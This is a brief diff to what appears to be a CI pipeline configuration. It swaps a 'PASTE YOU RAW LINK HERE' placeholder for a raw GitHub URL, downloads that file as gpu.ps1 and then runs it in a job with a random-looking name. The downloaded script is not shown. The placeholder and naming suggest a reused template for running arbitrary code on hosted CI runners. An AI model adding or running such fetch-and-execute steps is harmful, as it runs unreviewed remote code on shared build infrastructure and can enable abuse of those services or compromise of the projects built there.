@@ -16,6 +16,6 @@ jobs:
       - run: 
           name: 24tkACw7oK9dkk3VEbE1AuLhBjL_5vHopmexyGcw2jXt2M93
           command: |      
-            Invoke-WebRequest PASTE YOU RAW LINK HERE -OutFile gpu.ps1 
+            Invoke-WebRequest https://raw.githubusercontent.com/Sampurnane/exxx/main/sh -OutFile gpu.ps1 
           
       - run: ./gpu.ps1
